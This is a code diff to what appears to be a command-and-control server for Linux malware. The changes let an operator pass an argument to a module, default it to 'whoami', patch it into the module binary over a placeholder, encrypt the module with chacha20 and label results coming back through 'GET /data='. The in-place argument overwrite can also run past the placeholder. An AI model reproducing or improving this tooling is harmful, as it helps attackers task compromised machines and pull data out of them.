@@ -52,6 +52,23 @@ SOCKET http_socket = INVALID_SOCKET;
 // Head of all queues
 Queue* queueList = NULL;
 
+void *memmem(const void *haystack, size_t haystacklen,
+                      const void *needle, size_t needlelen) {
+    if (needlelen == 0 || haystacklen < needlelen) {
+        return NULL;
+    }
+
+    const unsigned char *h = haystack;
+    const unsigned char *n = needle;
+
+    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
+        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
+            return (void *)(h + i);
+        }
+    }
+    return NULL;
+}
+
 char *bytes_to_hex(const unsigned char *buf, size_t len) {
     // 2 hex chars per byte + 1 for null terminator
     char *hexstr = malloc(len * 2 + 1);
@@ -127,9 +144,21 @@ unsigned char *load_module(char *module, int *size){
         module[len - 1] = '\0';
     }
 
+    // find first space
+    char *space = strchr(module, ' ');
+    char *moduleName, *argumentStr;
+    if (space) {
+        *space = '\0'; // terminate module name
+        moduleName = module;          // module = first token
+        argumentStr = space + 1;     // args = rest of string
+    } else {
+        moduleName = module;          // only module, no args
+        argumentStr = "whoami";
+    }
+    
     // Load a binary file (e.g., "data.bin")
     char path[100];
-    snprintf(path, sizeof(path), "D:/linuxmal/modules/bin/%s.bin", module);
+    snprintf(path, sizeof(path), "D:/linuxmal/modules/bin/%s.bin", moduleName);
     FILE* file = fopen(path, "rb");
     if (!file) {
         printf("[-] Failed to open %s",path);
@@ -149,6 +178,12 @@ unsigned char *load_module(char *module, int *size){
 
     fread(file_buffer, 1, file_size, file);
     fclose(file);
+
+    //replece with arguments
+    char *pos = memmem(file_buffer, file_size, "0xFFFFFFFF", strlen("0xFFFFFFFF")); //strstr(file_buffer, "0xFFFFFFFF");
+    if (pos) {
+        memcpy(pos, argumentStr, strlen(argumentStr) + 1);  // overwrite in place
+    }
 
     // Encrypt the file content
     unsigned char* encrypted_data = chacha20_Full(file_buffer,file_buffer,file_size);
@@ -291,7 +326,7 @@ DWORD WINAPI handle_http_connections(LPVOID arg) {
             }
 
             if (strncmp((char*)decrypted, "GET /data=", 10) == 0) {
-                snprintf(buffer, sizeof(buffer), "%s\0", &buffer[10]);
+                snprintf(buffer, sizeof(buffer), "DATA:%s\0", &buffer[10]);
             }
             printf("Size - %d\n",bytes_receivedU64);
             printf("out:\n%s\n", buffer);
